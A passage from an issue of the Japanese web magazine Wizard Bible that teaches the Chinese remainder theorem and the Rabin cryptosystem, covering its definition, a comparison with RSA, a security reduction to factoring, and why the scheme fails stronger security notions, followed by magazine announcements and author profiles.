+ができることに注意して欲しい。
+
+　ここでは解の存在と解の一意性の証明は省き、数値例を示す。
+
+例：x≡1 (mod 3)、x≡2 (mod 5)、x≡3 (mod 7)の連立合同式を計算する。
+
+m1=3,m2=5,m3=7とおく。
+m1～m3がいずれも互いに素であるから、CRTを用いることができる。
+
+M=m1・m2・m3=3・5・7=105
+
+M1=M/m1=m2・m3=35
+M2=M/m2=m1・m3=21
+M3=M/m3=m1・m2=15
+
+y1=(M1)^(-1) mod m1=35^(-1) mod 3=2^(-1) mod 3=2 mod 3
+y2=(M2)^(-1) mod m2=21^(-1) mod 5=1 mod 5
+y3=(M3)^(-1) mod m3=15^(-1) mod 7=1 mod 7
+
+M1・y1=35・2=70
+M2・y2=21・1=21
+M3・y3=15・1=15
+
+x=a1・M1+a2・M2＋a3・M3=1・70+2・21＋3・15=70+42+45 mod M≡52 mod 105
+
+●x=[a,b]
+
+　p,qを素数、N=pqとする。このとき「x≡a (mod p)」かつ「x≡b (mod q)」を満
+たすx∈Z_Nを、x=[a,b]と記述する。
+
+　x=[a,b]を具体的に求めるためには、CRTを用いればよい。
+
+
+■0x03.) Rabin暗号の定義
+
+　公開鍵暗号は鍵生成アルゴリズム・暗号化アルゴリズム・復号アルゴリズムの
+3つのアルゴリズムで構成されるということはWB34で説明した。今回紹介するRab
+in暗号も公開鍵暗号の一種なので、3つのアルゴリズムから構成される。
+
+●鍵生成アルゴリズム（KeyGen）
+
+1：セキュリティパラメータ1^kを入力とする。
+
+2：大きな素数p,qを生成する。
+
+3：N=pqを計算する。
+
+4：pk=N、sk=(p,q)を出力する。
+
+●暗号化アルゴリズム（Enc）
+
+1：pk=N、m∈Z_Nを入力とする。
+
+2：c≡m^2 (mod N)を計算する。
+
+3：cを出力する。
+
+●復号アルゴリズム（Dec）
+
+1：sk=(p,q)、c=m^2を入力とする。
+
+2：x^2≡c (mod p)、x^2≡c (mod q)の平方根を求める。ここでは計算結果をx≡
+±a (mod p)、x≡±b (mod q)とおく。
+
+3：M1=[a,b]、M2=[a,-b]、M3=[-a,b]、M4=[-a,-b]を計算する。
+
+4：M1～M4のいずれかを出力する。
+
+●補足
+
+　以上で定義した3つのKeyGen,Enc,DecがRabin暗号の定義である。定義とは別と
+して、補足したいことがある。
+
+　KeyGenのステップ1におけるセキュリティパラメータとは、ビット長を決めるも
+のである。kではなく、1^kを入力とする理由については、各アルゴリズムはチュ
+ーリングマシンと呼ばれるモデルで考えていることに大きく関係する。ここでは
+チューリングマシンについては紹介しないため、KeyGenの入力は単にビット長（
+2進数の世界の桁数）を意味していると認識してもらえればよい。
+　KeyGenのステップ2において、p,qは単に大きな素数とのみ指定している。本に
+よっては、もっと制限された素数を用いている場合もある。ここでは最も基本的
+なRabin暗号の紹介をしたいため、シンプルな素数の選び方にした。
+　KeyGenのステップ4におけるpkは公開鍵、skは秘密鍵である。
+
+　Encのステップ1におけるmは平文、ステップ3におけるcは暗号文である。つまり、
+公開鍵pkと平文mで暗号文cを計算していることがわかる。
+
+　Decのステップ2において、2つの合同方程式の平方根を求める必要がある。素数
+を法とした場合は効率的に平方根が計算可能であることが知られているので、こ
+れは効率的に計算可能である。
+　Decのステップ3における4つの計算は、それぞれに対してCRTを適用させればよ
+い。
+　Decのステップ4において平文がM1～M4のように4つ計算される。M1～M4のいずれ
+かが妥当な平文mであるが、妥当な平文に絞り込むためには別の仕組みの助けが必
+要とされる。その仕組みに関する考察はは後述する。
+
+
+■0x04.) Rabin暗号 vs. RSA暗号
+
+　WB34において（教科書的）RSA暗号を紹介した。ここではRabin暗号とRSA暗号を
+比較してみる。
+
+●アルゴリズム
+
+　復習になるが教科書的RSA暗号の暗号文はm^e (mod N)であった。一方、Rabin暗
+号の暗号文はm^2 (mod N)である。これだけの比較によれば、Rabin暗号はe=2の場
+合のRSA暗号と思える。しかし、そうではない。なぜならば、KeyGenに注目しても
+らえばよい。教科書的RSA暗号のKeyGenにおいて、「GCD((p-1)(q-1),e)=1」を満
+たすeを生成している。つまり、常に「GCD((p-1)(q-1),e)=1」が成り立っている
+ということである。p,qは素数なので、奇数である。
+　よって、p-1,q-1はどちらも偶数である。(p-1)(q-1)も偶数になることを踏まえ
+ると、e=2のときに「GCD(e,(p-1)(q-1))=1」は成り立たない。ゆえに、Rabin暗号
+は教科書的RSA暗号の特殊ケースというわけでもないことがわかる。
+　そして、Rabin暗号のDecでは2次合同式である「c≡m^2 (mod N)」（N=pq）は4
+つの解が計算される。しかし、「GCD(e,(p-1)(q-1))≠1」であるために4つから1
+つに絞り込めないのである。
+
+●安全性
+
+　教科書的RSA暗号は、RSA仮定の下でOW-CPA安全である。OW-CPAという表記につ
+いてはWB40を参照して欲しい。
+　一方、Rabin暗号は、大きな桁の合成数の場合は素因数分解が困難であるとい
+う仮定（以降、素因数分解困難仮定と呼ぶことにする）の下でOW-CPA安全である。
+Rabin暗号（1979年）はRSA暗号（1977年）の提案後に発表されたが、実は安全性
+証明が付いた初の公開鍵暗号である。
+
+　RSA暗号と素因数分解困難仮定を比較すると、後者の方が弱い仮定である。仮定
+は弱い方が嬉しいと、WB39で紹介した。つまり、Rabin暗号とRSA暗号は安全性の
+みでみるとOW-CPA安全と同じであり、仮定で見るとRabin暗号の方がより理想的と
+いえる。
+
+●効率性
+
+　教科書的RSA暗号のEncでは、m^eを計算する。つまり、mod nの世界における平
+方計算と乗算計算が必要とされる。この計算はWB35で紹介したべき乗計算のアル
+ゴリズムが利用される。これにより、単純に乗算するよりも効率的に計算できる。
+　一方、Rabin暗号のEncでは、m^2を計算する。つまり、mod nの世界における平
+方計算だけで済む。
+　よって、暗号化に関しては、Rabin暗号の方が高速と言える。
+
+　教科書的RSA暗号のDecでは、c^dを計算する。つまり、mod nの世界における平
+方計算と乗算計算が必要とされる。
+　一方、Rabin暗号のDecでは、x^2≡c (mod p)、x^2≡c (mod q)の平方根、そし
+てCRTの計算が必要である。
+
+　ところで、KeyGenで生成されるp,qを単純に大きな素数とするのではなく、p,q
+を法4の世界で3になる素数（Blum数を構成するp,q）にすると、復号が早くなると
+いう。
+
+●特徴
+
+　Rabin暗号は一意性の問題が存在する。暗号文であるc mod nを復号すると、4つ
+の平方根が求まり、その4つのうちの1つが正しい平文mになる。正しい平文を特定
+するにはいくつかの方法が存在する。
+　平文を特定する最も素朴な方法は、復号して得られた4つの値の内容を読み取り、
+正しい文章を選ぶという方法である。しかし、正しい文章であるかを自動的に識
+別するというのは一般には難しい。しかも、確実性がない。それだけではなく、
+平文そのものは言語として意味を成すとは限らない。例えば、公開鍵暗号を共通
+鍵暗号での暗号化で用いる鍵を、公開鍵暗号で通信者の間において共有するとい
+う場合もありうる（いわゆるハイブリッド暗号）。この場合は、公開鍵暗号の暗
+号化アルゴリズムに入力される平文は鍵（セッション鍵）なので、一種の乱数の
+ようなものなので、意味のある文章を形成するわけがない。
+　次に考えられる方法としては、平文に特殊な構造を入れることである。例えば、
+固定のフラグを含むようにしたり、平文の最後の64ビットをその直前の64ビット
+と同じにするなどである。しかし、この方法をRabin暗号の平文としてしまうと、
+確かに一意性の問題は解決されるが、素因数分解問題と同値性がまったくなくな
+る。つまり、素因数分解困難仮定であっても、安全性が保障されなくなってしま
+うということである。
+　最もよい解決策は、一意性の問題を解決したWillams暗号を使うことである。W
+illiams暗号については次回のWBで紹介する予定である。
+
+
+■0x05.) Rabin暗号の安全性
+
+●OW-CPA安全
+
+　OW-CPA攻撃者がRabin暗号を解くことと、素因数分解問題を解くことは同値であ
+るが知られている。つまり、Rabin暗号は素因数分解仮定の下でOW-CPA安全である。
+この事実を帰着法で証明する。
+
+[定理]OW-CPA攻撃者がRabin暗号を解くことと、素因数分解問題を解くことは同値
+である。
+
+[証明]まずAをNとcから平文の候補mを効率的に出力する、即ちOWを破る（暗号文
+cから平文mを完全に求める）アルゴリズムとする。BをNを効率的に素因数分解す
+るアルゴリズムとする。
+
+[1]Bが存在する⇒Aが存在する
+
+　Bの力を利用してAを構成することができればよい。
+　AはN,cが入力される。内部のBに対してNを与える。するとBはp,qを出力するの
+で、Aはp,qを知ることができる。p,qを知ることができれば、Rabin暗号のDecを利
+用できるので、cからmを出力できる。
+
+[2]Aが存在する⇒Bが存在する
+
+　Aの力を利用してBを構成することができればよい。
+　BはNが入力される。BはZ_Nから一様ランダムにm'を選択し、c=(m')^2 mod Nを
+計算する。そして、内部のAに対してNとcを入力する。このcはhonestに暗号文を
+作ったときと同じ作り方であるため、AはBの内部に存在することに気づきようが
+ない。よって、Aはmを出力する。
+　Bはmを知ることができ、GCD(m'-m,N)を計算して出力する。
+
+　m'=[a,b]とすると、c=(m')^2 mod N=[a^2,b^2]になる。Aが出力するmはcの平文
+候補の1つなので、mは次の4つのm1～m4のいずれかになっている。
+
+・m1=[a,b]
+・m2=[-a,b]
+・m3=[a,-b]
+・m4=[-a,-b]
+
+(i)m=m1=[a,b]のとき、m'-m1=[a,b]-[a,b]=[0,0]を求める。
+　つまり、m'-m1≡0 mod pかつm'-m1≡0 mod qを満たすm'-m mod Nを求める。
+　p,qは素数なので、明らかに互いに素であり、CRTによりm'-m mod Nを求めるこ
+とができる。
+
+　ここからはCRTの説明で使った記号を一時的に使うことに注意。
+
+M=m1m2
+
+M1=M/m1=m2=q
+M2=M/m2=m1=p
+
+y1=(M1)^(-1) mod m1=q^(-1) mod p　←q^(-1)は計算せずにこのままで問題なし。
+y2=(M2)^(-1) mod m2=p^(-1) mod q
+
+x=a1・M1・y1+a2・M2・y2 mod M
+
+　以上で準備ができた。これを定理の証明内で使っている記号に置き換えると次
+のようになる。
+
+m'-m1=0・q・q^(-1)+0・p・p^(-1) mod N=0+0=0
+m'-m1=Nr (∀r∈Z)
+
+　よって、GCD(m'-m,N)=GCD(Nr,N)=N
+
+(ii)m=m2=[-a,b]のとき、m'-m=[a,b]-[-a,b]=[2a,0]を求める。
+　つまり、m'-m≡2a mod pかつm'-m≡0 mod qを満たすm'-m mod Nを求める。(i)
+と同様にCRTを使って求めると次のようになる。
+
+m'-m2=2a・q・q^(-1)+0・p・p^(-1) mod N=2a・q・q^(-1)
+
+　よって、GCD(m'-m,N)=GCD(2a・q・q^(-1),pq)=q
+
+(iii)m=m3=[a,-b]のとき、m'-m=[a,b]-[a,-b]=[0,2b]を求める。
+　つまり、m'-m≡0 mod pかつm'-m≡2b mod qを満たすm'-m mod Nを求める。(i)
+と同様にCRTを使って求めると次のようになる。
+
+m'-m3=0・q・q^(-1)+2b・p・p^(-1) mod N=2b・p・p^(-1)
+
+　よって、GCD(m'-m,N)=GCD(2b・p・p^(-1),pq)=p
+
+(iv)m=m4=[-a,-b]のとき、m'-m=[a,b]-[-a,-b]=[2a,2b]を求める。
+　つまり、m'-m≡2a mod pかつm'-m≡2b mod qを満たすm'-m mod Nを求める。(i)
+と同様にCRTを使って求めると次のようになる。
+
+m'-m4=2a・q・q^(-1)+2b・p・p^(-1) mod N
+
+　よって、GCD(m'-m,N)=GCD(2a・q・q^(-1)+2b・p・p^(-1),pq)=1
+
+　以上の(i)～(iv)をまとめると次の結果になった。
+
+-----------------------
+| m'-m  | GCD(m'-m,N) |
+|-------+-------------|
+| m'-m1 | N           |
+|-------+-------------|
+| m'-m2 | q           |
+|-------+-------------|
+| m'-m3 | p           |
+|-------+-------------|
+| m'-m4 | 1           |
+-----------------------
+
+　よって、Aがmをm1～m4をそれぞれ1/4で出力するとき、Bが素因数分解に成功す
+る（Bの出力がpありはqになる）確率は、Aの成功確率の4分の1になる。
+
+　したがって、A,Bの成功確率をそれぞれAdv(A),Adv(B)と表記すると、
+
+Adv(B)=Adv(A)/4
+
+が成り立つ。
+
+　つまり、Bが4回中に1回は素因数分解に成功することになり、十分大きな確率で
+ある。ここでした議論は1/4の確率で成功するBの具体的な構成であった。もしか
+したら、さらにうまいBの具体的な構成があるかもしれないので、一般にはAdv(B)
+≧Adv(A)/4ということになる。実際にこれが正しいことを示すために、具体的に
+別のBの構成法を紹介しよう。
+
+[別証]改良版のBの構成法
+
+　Aの力を利用してBを構成することができればよい。
+　BはNが入力される。BはZ_Nから一様ランダムにm'を選択する。選択したm'がGCD
+(m',N)=1を満たすかどうかを確認する。もしGCD(m',N)≠1ならば、m'はpかqを当
+ててしまった状態である。このときはm'を出力すれば素因数になっている。一方、
+もしGCD(m',N)=1ならば、次の操作に進む。
+、c=(m')^2 mod Nを計算する。そして、内部のAに対してNとcを入力する。このc
+は仕様通りに暗号文を作ったときと同じ作り方であるため、AはBの内部に存在す
+ることに気付きようがない。よって、Aはmを出力する。
+　Bはmを知ることができ、mがm'あるいは-m' mod Nであれば、もう一度cを作り直
+してAを起動し直す。これをAが出力するmがm'あるいは-m' mod Nでない値になる
+まで繰り返す。Bがm'あるいは-m' mod Nでない値を得ることができたら、GCD(m'
+-m,N)を計算して出力する。
+
+　以上で改良版のBの構成は完了である。基本はさきほどのBの構成と同じである。
+　Bがm'を選択した時点で、GCD(m',N)≠1が成り立てば、m'=p,qのいずれかのとき
+である（このときの状況をEventと呼ぶことにする）。よって、Bはm'をそのまま
+出力すれば素因数分解に成功する。しかし、その確率は確率は無視できるほど小
+さい。
+　Aの出力mはm1～m4のいずれかであった。そのうちm=m1,m4のときは従来のBは素
+因数分解を解くことに失敗している。そこで、改良版のBはAの出力がm=m1または
+m4であった時点で、また新しくAにmの生成をお願いするのである。失敗の度にAを
+起動し直すため、いつかはm2あるいはm3を出力することを期待できる。
+　これらの注意点を考慮して、改良版のBの成功確率を評価してみる。ここではA
+への問い合わせ回数をkとする（セキュリティパラメータで使ったkとは別物なの
+で注意）。
+
+Adv(B) = Adv(A)(1-(1/2)^k) + Pr[Event]
+
+　Pr[Event]=2/Nであり、無視できるほど小さい。
+
+　したがって、次がBの成功確率として考えてよい。
+
+Adv(B) = Adv(A)(1-(1/2)^k)
+
+　k=1のときはAを1回だけ起動するときであり、このときは1/2の確率でしか素因
+数分解が解けず、従来のBと同じ成功確率になっている。
+　kの数が増えれば増えるほど、(1/2)^kは小さくなるので、1-(1/2)^kは大きくな
+り、Adv(A)(1-(1/2)^k)も大きくなることがわかる。
+
+　Rabin暗号が素因数分解仮定の下でOW-CPA安全であることが示されたことが証明
+できた。次に知りたいのはOW-CPA安全よりも強い安全性を持つかどうかという点
+である。OW-CPA安全に近い安全性として、OW-CCA安全とSS-CPA安全（IND-CPA安全
+と等価なので、以後はIND-CPA安全で考える）であることはWB40の公開鍵暗号の安
+全性の表よりわかる。
+　結果から述べると、Rabin暗号はOW-CCA安全・IND-CPA安全でないことが知られ
+ている。このことを直観的に考えてみよう。
+
+●OW-CCA安全でない
+
+　OW-CCA安全を破る攻撃者は暗号化オラクルを利用することができ、公開鍵とタ
+ーゲット暗号文が与えられたときに、ターゲット暗号文の平文を求めることが目
+標である。
+
+　攻撃者Aにはpk=N、ターゲット暗号文c^*(=(m^*)^2 mod N)が入力される。
+　Z_N上から一様ランダムにm'を選択して、c'=(m')^2 mod Nを計算する。このc'
+を復号オラクルDOに送信する。すると復号オラクルはcの平文候補としてm~をAに
+返信する。
+　AはGCD(m~-m',N)を計算することで、確率1/2でNの素因数を確定できる。つまり、
+Aは確率1/2でp,qを知ることができる。
+　p,qを知ることができれば、秘密鍵を知っていることと同値であり、Decアルゴ
+リズムを使って暗号文から平文を取り出すことがでｋりう。ただし、Decアルゴリ
+ズムを使っても1/4でしか妥当なm^*を取り出せない。
+　ゆえに、このように構成したAは1/8の確率でOWを破っていることになる。1/8の
+確率は十分大きいため、Rabin暗号はOW-CCA安全ではない。
+
+　ついでに別の攻撃者Aの構成も紹介する。
+　攻撃者Aにはpk=N、ターゲット暗号文c^*(=(m^*)^2 mod N)が入力される。
+　2^2をc^*に掛け算して、その計算結果をc'として復号オラクルに送信する（復
+号オラクルにはターゲット暗号文を送信してはならないから、うまく細工をして
+いる）。c'=(2^2)×(c^*)=(2m^*)^2が成り立つため、復号オラクルの返信は1/4の
+確率で2m^*である。
+　Aは2m^*を2で割れば、m^*になり平文を取り出すことができる。
+　ゆえに、このように構成したAは1/4の確率でOWを破っていることになる。1/4の
+確率は十分大きいため、Rabin暗号はOW-CCA安全ではない。
+
+●IND-CPA安全でない
+
+　IND-CPA安全を破る攻撃者は暗号化オラクルを利用することができ、チャレンジ
+ャーが選んだbを推測することが目標である。
+
+　攻撃者AにはNが入力される。
+　Z_N上から一様ランダムにm0,m1を選択して、(m0,m1)をチャレンジャーに送信す
+る。すると1ビットのbをランダムに選択して、暗号文c=Enc(m_b)を計算する。そ
+のcはチャレンジャーからAに返信されてくる。
+　次に、m0,m1をそれぞれ暗号化オラクルに送信する。すると、c0,c1を知ること
+ができる。
+　そこで、c=c0が成り立つかどうかを確認する。もし成り立てばb=0、成り立たな
+ければb=1であることが100%の確率で識別できてしまう。ゆえに、Rabin暗号はIN
+D-CPA安全ではない。
+
+　実はこのような議論はRabin暗号に限らず、確定的暗号（暗号化時に内部で乱数
+を使ってない暗号）ならばすべてにおいて言えることである。そのため、Rabin暗
+号もRSA暗号もIND安全であることはない。
+
+
+■0x06.) 終わりに
+
+　次回はRabin暗号が持つ平文の一意性という課題を解決した暗号について紹介し
+たいと思う。今回の記事にしている内容は厳密な議論というより、直観的な議論
+が多い。しかしながら、直観的に妥当性が見出せなくては、厳密な議論ができる
+はずがない。そのため、今回の記事のように試行錯誤感が強い直観的な議論をす
+ることは無駄ではないと思う。
+
+　では、また次号で会いましょう。
+
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+ --- 第7章: お知らせ ---
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+○Wizard Bible（http://wizardbible.org/）では随時、執筆ライターを募集して
+います。
+　扱う内容のテーマは広義での「under ground」です。例えばハッキングやセキ
+ュリティからピッキングなどと幅広い内容を考えています。また特殊な職業や趣
+味の解説などでも構いません。
+　一回きりでも構いません。また必ず毎回連載する義務もありませんので、でき
+る範囲で構いません。気軽に声をかけてください。
+
+○Kenji AikoさんがQ&Aを作ってくれました。初めて参加する人でもわかりやすく
+書かれていますので、参考にしてください。
+
+http://wizardbible.org/wbQandA.html
+
+○Wizard Bibleに参加希望の方は気軽にメール（ipusiron@gmail.com）ください。
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+  ---- 第8章: 著者プロフィール ---
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+
+■金床
+●Job: プログラマー
+●Web: http://guardian.jumperz.net/, http://www.jumperz.net/
+●Mail: anvil@jumperz.net
+●Comment:
+　ﾜﾀｸｼの会社ではｳｪﾌﾞｱﾌﾟﾘ作りが好きなﾌﾟﾛｸﾞﾗﾏｰ/ｴﾝｼﾞﾆｱ系の人を募集しようかと
+思っているところ（なんだそりゃ）です。お金はあまり出ませんが比較的自由な
+感じの職場というｳﾜｻです。興味ある方はﾒｰﾙくだちい。活かせないｽｷﾙは以下にな
+ります。
+・Windowsｻｰﾊﾞｰ管理系ｽｷﾙ
+・（Microsoftの）ASP、C#とかVB
+・汎用ｺﾝﾋﾟｭｰﾀの知識　JCLとかｗ
+・COBOLｗｗｗ
+●この夏やりたいこと・やったこと
+　この夏は横須賀沖の要塞、猿島にいってきますた！
+　某電車事故氏と鯖管系話題で盛り上がっていたところ、「ｻｰﾊﾞｰ作りや管理は楽
+しいですよね。だって自分の秘密基地作ってるみたいなもんじゃないですか！」
+と一言。おおっなるほど。ｻｰﾊﾞ管理って面倒で大変で金にならないのになんでこ
+んなに楽しいのか、という長年の疑問が氷塊しますた。
+
+
+■Will
+●Job: Student
+●Web: http://security.symphonic-net.com/
+●Mail: will_net@hotmail.co.jp
+●Comment:
+　まぁなんというか、久しぶりにWizard Bibleの記事を書いて疲れましたｗ　や
+ってることは簡単なんですが、文章にするのはやはり難しい。でも、やはり解析
+関係の記事を書くのは中々面白いです。
+　つか、そういうお仕事くださいｗ　最近はアルバイトしてなくて金穴なのでで
+ケチりまくってるWillでしたー。
+●この夏やりたいこと・やったこと
+　取り敢えず、一週間くらい大学の図書館に通って勉強ですかね。涼しいし、静
+かだし、本も良いのが揃ってるから良い感じ。
+　後は彼女と花火大会に行く事くらいですかねー。
+
+
+■理事長（Rudolph von Gartheimer）
+●Job:Der vollstreckende Vorsitzender des zentralen Exekutivkomitees
+●Web:http://www.gartheimer.com/
+●Mail:gartheimer@hotmail.com
+●Team（Group）：宗凶法人 愛連合
+●Comment:
+　今回のネタもウチのメルマガの焼き直し、というかほぼコピペです。読者層が
+多い方が役立つ考え、原稿を寄せてみました。皆様の身近な経済学にお役にたて
+られれば幸いです。
+●この夏やりたいこと・やったこと
+　夏はもっとも嫌いな季節なんですが、やりたいことは海に標本採集に出かけた
+いですね。フジツボとか食べると美味しいので、バーナーで焼き殺して食べてみ
+たり。まさに海の幸！！
+　やったことと言えば、EPSILON殿を初めとするデータハウスの書籍を参考にして
+とあるサーバーを建てたこととです。IT系の技術者様の投稿が多い、このWizard
+ Bibleでワタシは極めて異端ですが、蛇の道は蛇。お金に関することでなにかお
+困りでしたら、お気軽にご連絡くださいませ。
+
+
+■Defolos
+●Job: Student
+●Web: http://ruffnex.oc.to/defolos/
+●Mail: defolos@ruffnex.oc.to
+●Team（Group): none
+●Comment:
+　こんにちは、Defolosです。
+　今回、実は結構苦労しました。フォーマットストリング攻撃で戻りアドレスを
+書き換えるサンプルってほとんど紹介されてなくて、SEIPの場所を見つけ出すの
+に四苦八苦…。まぁ、最終的にちゃんとroot奪取できたから良かったです。
+●この夏やりたいこと・やったこと
+　書籍の執筆を頑張りたいです。これまで試験とか色々ありまして、ほとんど進
+まなかったので、この夏を利用してバリバリ書いていきたいですね。あと、ゼミ
+でプログラミングのバイトをやることになったので、そっちも気合入れて頑張り
+たいです。
+
+
+■Kenji Aiko
+●Job: engineer
+●Web: http://ruffnex.oc.to/kenji/
+●Mail: kenji@ruffnex.oc.to
+●Comment:
+　前回の金床さんの「ｻｼｰﾐとﾂﾅｰﾐ」が面白すぎたｗ（視点が斬新すぎｗ）。Wiza
+rd Bibleは技術系ネタじゃなくてもやっていけるのでは？　と思ってしまったが、
+それは僕が困るので、技術ネタ書ける方、ぜひよろしくお願いしますm(_ _)m。
+●この夏やりたいこと・やったこと:
+　やりたいプログラミングをやりたい（というかやる）。研究したいことは山ほ
+どあるので、片っ端から手を出していきまつ。やっぱりセキュリティ技術は面白
+い。
+
+
+■IPUSIRON
+●Job: 赤魔道士
+●Web: http://akademeia.info
+●Mail: ipusiron@gmail.com
+●Comment:
+・家のPC新調しました。HHKを数日間使っていましたが、打ち間違えが多すぎだっ
+たので、やっぱり安物の普通のキーボードに戻しました。
+・Softbankから「第2世代の携帯電話サービスを終了します」という葉書が来て、
+呆然としてます。機種変更するとラブ定額なくなるから困ります。
+●この夏やりたいこと・やったこと:
+　2ヶ月ぐらい前に徒歩で山手線の周りを一周到達しました（もちろん1日ではな
+い）。
+　次は五色不動を回ってみたいと思っています。家の近くに目赤不動があり、会
+社の近くに目青不動、この前目黒不動行ってきました。この夏のうちに、残りの
+目白不動と目黄不動に行っておきたいと思います。
+　個人的にお勧めのスポット紹介してみます。
+・目黒の寄生虫博物館：寄生虫の精巧なスケッチを見ると、勉強をやる気にさせ
+てくれます。
+・飯田橋の東京理科大学近代科学資料館：コンピュータ好きなら是非。TK-80やC
+PU 8080が陳列されており、タイガー計算機を実際に触ることもできます。
+・上野の国立科学博物館：常設の3Fの動物剥製群が圧巻。元々はこれらすべてが
+個人が所有していたものだという聞くとさらに驚く。
+・神保町の明倫館書店：理工学書専門の古書店。お買い得な本やレアな本がどっ
+さり。
+・東京丸の内の皇居：皇居外苑・彩味処で和風バイキングしてから、皇居の広場
+を散策。時間があれば、近くの平将門の首塚見て、モチベーション上げてから歴
+史本専門店「時代屋」まで歩くのもよいかも。
+・お台場の日本科学未来館：興味のある特別展やってるときについでに常設みる
+とよいと思う。
+
+
